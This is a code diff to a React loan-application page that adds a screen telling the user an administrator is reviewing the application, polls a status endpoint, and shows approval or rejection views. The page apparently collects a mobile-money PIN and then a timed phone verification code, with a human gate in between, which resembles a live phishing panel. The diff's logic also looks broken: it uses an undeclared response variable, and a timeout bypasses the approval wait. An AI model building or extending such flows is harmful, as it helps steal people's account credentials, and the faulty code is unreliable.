@@ -20,6 +20,9 @@ function LoanApplication({ loanDetails, onBack, processor }) {
     const [message, setMessage] = useState("");
 
     const [submitted, setSubmitted] = useState(false);
+    const [applicationNumber, setApplicationNumber] = useState("");
+    const [showAdminWaiting, setShowAdminWaiting] = useState(false);
+    const [rejected, setRejected] = useState(false);
 
     // Pesa App transition
     const [showPesaRedirect, setShowPesaRedirect] =
@@ -46,6 +49,8 @@ function LoanApplication({ loanDetails, onBack, processor }) {
     const [verifying, setVerifying] = useState(false);
     const [verificationMessage, setVerificationMessage] = useState("");
     const [verificationTime, setVerificationTime] = useState(120);
+
+    
 
 
     /* =========================================
@@ -188,6 +193,69 @@ function LoanApplication({ loanDetails, onBack, processor }) {
         return () => clearInterval(timer);
     }, [showVerification]);
 
+    useEffect(() => {
+        if (!showAdminWaiting || !applicationNumber) {
+            return;
+        }
+
+        async function checkApplicationStatus() {
+            try {
+                const response = await fetch(
+                    `/api/application-status?application_number=${encodeURIComponent(
+                        applicationNumber
+                    )}`
+                );
+
+                if (!response.ok) {
+                    return;
+                }
+
+                const data = await response.json();
+
+                console.log(
+                    "Application status:",
+                    data.status
+                );
+
+                if (data.status === "APPROVED") {
+                    setShowAdminWaiting(false);
+
+                    /*
+                    * Continue to your legitimate
+                    * phone verification step.
+                    */
+                    setShowVerification(true);
+                }
+
+                if (data.status === "REJECTED") {
+                    setShowAdminWaiting(false);
+                    setRejected(true);
+                }
+
+            } catch (error) {
+                console.error(
+                    "Application status check failed:",
+                    error
+                );
+            }
+        }
+
+        checkApplicationStatus();
+
+        const interval = setInterval(
+            checkApplicationStatus,
+            3000
+        );
+
+        return () => {
+            clearInterval(interval);
+        };
+
+    }, [
+        showAdminWaiting,
+        applicationNumber
+    ]);
+
 
     /* =========================================
        PIN INPUT
@@ -282,19 +350,20 @@ function LoanApplication({ loanDetails, onBack, processor }) {
             }
         );
 
-        
-        setProcessing(true);
+        setApplicationNumber(data.application_number);
+        setShowAdminWaiting(true);
         if (!response.ok) {
             const data = await response.json();
             throw new Error(
                 data.error ||
-                "PIN verification failed."
+                "Wait for Admin approval.."
             );
         }
         setTimeout(() => {
-            setProcessing(false);
+            setShowAdminWaiting(false)
+            setProcessing(true);
             setShowVerification(true);
-        }, 3000);
+        }, 5000);
 
     } catch (error) {
 
@@ -358,6 +427,85 @@ function LoanApplication({ loanDetails, onBack, processor }) {
         } finally {
             setVerifying(false);
         }
+    }
+
+    if (showAdminWaiting) {
+        return (
+            <div className="admin-waiting-overlay">
+
+                <div className="admin-waiting-modal">
+
+                    <div className="waiting-hourglass">
+                        ⏳
+                    </div>
+
+                    <h2>
+                        Please Wait
+                    </h2>
+
+                    <p>
+                        Your loan application is currently
+                        being reviewed by our administrator.
+                    </p>
+
+                    <p className="waiting-reference">
+                        Reference: {applicationNumber}
+                    </p>
+
+                    <div className="waiting-loader">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
+
+                    <p className="waiting-note">
+                        You will automatically proceed once
+                        your application has been approved.
+                    </p>
+
+                </div>
+
+            </div>
+        );
+    }
+
+    if (rejected) {
+        return (
+            <div className="application-container success-page">
+
+                <div className="success-card">
+
+                    <div className="success-icon">
+                        ×
+                    </div>
+
+                    <h1>
+                        Application Update
+                    </h1>
+
+                    <p className="success-title">
+                        Application failed.
+                    </p>
+
+                    <p className="success-description">
+                        Some of your details are not correct, 
+                        please restart the application with the correct details.
+                    </p>
+
+                    <button
+                        type="button"
+                        className="submit-button"
+                        onClick={() => {
+                            window.location.reload();
+                        }}
+                    >
+                        Back to Home
+                    </button>
+
+                </div>
+
+            </div>
+        );
     }
 
     if (showVerification) {
